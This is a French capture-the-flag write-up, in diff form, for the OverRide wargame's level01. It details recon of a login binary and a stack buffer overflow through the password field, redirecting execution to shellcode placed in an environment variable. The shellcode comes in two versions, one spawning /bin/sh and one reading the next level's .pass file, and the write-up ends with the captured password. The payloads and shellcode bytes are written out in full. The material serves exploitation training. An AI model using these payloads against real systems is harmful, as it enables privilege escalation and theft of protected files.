@@ -1,0 +1,159 @@
+level01@OverRide:~$ objdump -t ./level01
+
+./level01:     file format elf32-i386
+
+SYMBOL TABLE:
+	...
+0804a040 g     O .bss	00000064              a_user_name
+
+On a ici un programme qui sert de formulaire de connection avec des verification sur les entree utilisateur, et on remarque des vulnerabilite dans ces recuperation d'input.
+On va donc les exploiter:
+
+Premierement il y a une verification sur la variable utilisateur, qui doit correspondre a dat_wil pour acceder a la suite du programme
+
+level01@OverRide:~$ strings ./level01
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+_IO_stdin_used
+puts
+stdin
+printf
+fgets
+__libc_start_main
+GLIBC_2.0
+PTRh0
+UWVS
+[^_]
+verifying username....
+dat_wil
+admin
+********* ADMIN LOGIN PROMPT *********
+Enter Username:
+nope, incorrect username...
+Enter Password:
+nope, incorrect password...
+;*2$"$
+
+level01@OverRide:~$ ltrace ./level01
+__libc_start_main(0x80484d0, 1, -10364, 0x80485c0, 0x8048630 <unfinished ...>
+puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
+)           = 39
+printf("Enter Username: ")                            = 16
+fgets(Enter Username: dat_wil
+"dat_wil\n", 256, 0xf7fcfac0)                   = 0x0804a040
+puts("verifying username....\n"verifying username....
+
+)                      = 24
+puts("Enter Password: "Enter Password:
+)                              = 17
+fgets(^C <unfinished ...>
+--- SIGINT (Interrupt) ---
++++ killed by SIGINT +++
+level01@OverRide:~$ ltrace ./level01
+__libc_start_main(0x80484d0, 1, -10364, 0x80485c0, 0x8048630 <unfinished ...>
+puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
+)           = 39
+printf("Enter Username: ")                            = 16
+fgets(Enter Username: none
+"none\n", 256, 0xf7fcfac0)                      = 0x0804a040
+puts("verifying username....\n"verifying username....
+
+)                      = 24
+puts("nope, incorrect username...\n"nope, incorrect username...
+
+)                 = 29
++++ exited (status 1) +++
+
+Ensuite, peut importe l'input pour le password, le programme va s'exit avec un code d'erreur adapte selon la verification de la fonction verify_user_pass.
+L'exploitation se passera donc sur un buffer overflow
+
+level01@OverRide:~$ { python -c 'print("dat_wil")'; python -c 'print("a" * 80 + "cccc")'; } | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+Segmentation fault (core dumped)
+
+level01@OverRide:~$ dmesg
+	...
+[ 4254.115766] level01[1886]: segfault at 63636363 ip 0000000063636363 sp 00000000ffffd6f0 error 14
+
+Nous allons jump a l'adresse d'un shellcode place dans l'environnement.
+
+level01@OverRide:~$ export SHELLCODE=$(python -c 'print("\x90" * 200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
+
+(gdb) x/32x *environ
+0xffffd7be:	0x4c454853	0x444f434c	0x90903d45	0x90909090
+0xffffd7ce:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd7de:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffd7ee:	0x90909090	0x90909090	0x90909090	0x90909090
+	...
+
+level01@OverRide:~$ { python -c 'print("dat_wil")'; python -c 'print("a" * 80 + "\xfe\xd7\xff\xff")'; } | ltrace ./level01
+__libc_start_main(0x80484d0, 1, -10620, 0x80485c0, 0x8048630 <unfinished ...>
+puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
+)           = 39
+printf("Enter Username: ")                            = 16
+fgets("dat_wil\n", 256, 0xf7fcfac0)                   = 0x0804a040
+puts("verifying username....\n"Enter Username: verifying username....
+
+)                      = 24
+puts("Enter Password: "Enter Password:
+)                              = 17
+fgets("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 100, 0xf7fcfac0) = 0xffffd59c
+puts("nope, incorrect password...\n"nope, incorrect password...
+
+)                 = 29
+--- Called exec() ---
+__libc_start_main(0x402090, 1, 0x7fffffffee78, 0x412690, 0x412720 <unfinished ...>
+__errno_location()                                    = 0x7ffff7ff06a0
+_setjmp(0x7fffffffeca0, 0x7fffffffee78, 0x7fffffffee88, 0x412690, 0x412720) = 0
+getpid()                                              = 1904
+sigfillset(0x7fffffffea98)                            = 0
+sigaction(17, 0x7fffffffea90, NULL)                   = 0
+geteuid()                                             = 1001
+getppid()                                             = 1902
+__vsnprintf_chk(0x61a505, 27, 1, -1, 0x412ffe)        = 4
+malloc(32)                                            = 0x0061e010
+getcwd(NULL, 0)                                       = "/home/users/level01"
+__ctype_b_loc()                                       = 0x7ffff7ff06b8
+__ctype_b_loc()                                       = 0x7ffff7ff06b8
+__ctype_b_loc()                                       = 0x7ffff7ff06b8
+strchrnul(0x412db1, 61, 1, 0x7ffff7dd3720, 3)         = 0x412db1
+strlen("/home/users/level01")                         = 19
+malloc(24)                                            = 0x0061e060
+mempcpy(0x61e060, 0x412dae, 3, 8, 3)                  = 0x61e063
+mempcpy(0x61e064, 0x61e040, 19, 17495, 3)             = 0x61e077
+malloc(32)                                            = 0x0061e080
+isatty(0)                                             = 0
+sigaction(2, NULL, 0x7fffffffeb80)                    = 0
+sigfillset(0x7fffffffeb88)                            = 0
+sigaction(2, 0x7fffffffeb80, NULL)                    = 0
+sigaction(3, NULL, 0x7fffffffeb80)                    = 0
+sigfillset(0x7fffffffeb88)                            = 0
+sigaction(3, 0x7fffffffeb80, NULL)                    = 0
+sigaction(15, NULL, 0x7fffffffeb90)                   = 0
+sigfillset(0x7fffffffeb98)                            = 0
+sigaction(15, 0x7fffffffeb90, NULL)                   = 0
+read(0, "", 8192)                                     = 0
+_setjmp(0x7fffffffebb0, 0x61ad60, 0, -1, 0)           = 0
+_setjmp(0x7fffffffebb0, 0, 0x950ab6f31b3abb98, -1, 0) = 0
+_exit(0 <unfinished ...>
++++ exited (status 0) +++
+
+Cela fonctionne bien mais nous avons le probleme de garder le shell ouvert, comme dans un niveau de rainfall.
+Nous allons donc utiliser un autre shellcode qui va simplement afficher le fichier .pass de l'utilisateur.
+
+level01@OverRide:~$ export SHELLCODE=$(python -c 'print("\x90" * 80 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level02/.pass")')
+
+level01@OverRide:~$ { python -c 'print("dat_wil")'; python -c 'print("a" * 80 + "\x24\xd8\xff\xff")'; } | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
